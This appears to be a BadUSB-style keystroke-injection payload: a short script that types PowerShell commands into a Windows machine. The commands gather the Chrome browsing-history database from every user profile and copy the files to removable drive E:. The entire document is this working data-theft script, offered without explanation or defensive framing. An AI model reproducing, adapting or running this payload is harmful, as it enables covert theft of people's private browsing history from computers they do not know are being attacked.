layout('us')
type("$chromeProfilesPath = 'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\'; \n")
type("$destPath = 'E:\\BrowserData\\ChromeHistory\\'; \n")
type("Get-ChildItem -Path $chromeProfilesPath -Recurse -Include 'History' | ForEach-Object { \n")
type("$newName = $_.Directory.Name + '_' + $_.Name; \n")
type("Copy-Item -Path $_.FullName -Destination ($destPath + $newName) -Force }\n")
delay(500)



